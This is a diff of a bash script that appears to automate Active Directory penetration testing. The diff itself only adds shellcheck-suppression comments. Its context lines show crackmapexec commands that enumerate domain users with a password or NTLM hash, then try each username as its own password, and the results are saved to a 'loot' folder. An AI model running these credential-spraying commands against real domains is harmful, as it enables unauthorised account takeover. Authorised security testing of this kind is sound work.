@@ -23,21 +23,27 @@ show_help() {
 OPTIND=1
 while getopts u:p:H:d:i: opt; do
   case "$opt" in
+    # shellcheck disable=SC2221
     u)
       USER=${OPTARG}
       ;;
+    # shellcheck disable=SC2221
     p)
       PASS=${OPTARG}
       ;;
+    # shellcheck disable=SC2221
     H)
       HASH=${OPTARG}
       ;;
+    # shellcheck disable=SC2221
     d)
       DOM=${OPTARG}
       ;;
+    # shellcheck disable=SC2221
     i)
       IP=${OPTARG}
       ;;
+    # shellcheck disable=SC2222
     u | p | H | d | i)
       shift 2
       OPTIND=1
@@ -111,6 +117,7 @@ if [ -z "$HASH" ]; then
   date >>/root/output/runtime.txt
   # User txt from DC
   crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" --users >/root/output/list/raw.txt
+  # shellcheck disable=SC1003
   awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' >/root/output/list/user.txt
   rm /root/output/list/raw.txt
   crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >>/root/output/loot/intern/ad/iam/username/raw_"$DOM".txt
@@ -204,6 +211,7 @@ if [ -z "$PASS" ]; then
   date >>/root/output/runtime.txt
   # User txt from DC
   crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" --users >/root/output/list/raw.txt
+  # shellcheck disable=SC1003
   awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' >/root/output/list/user.txt
   rm /root/output/list/raw.txt
   crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >>/root/output/loot/intern/ad/iam/username/raw_"$DOM".txt
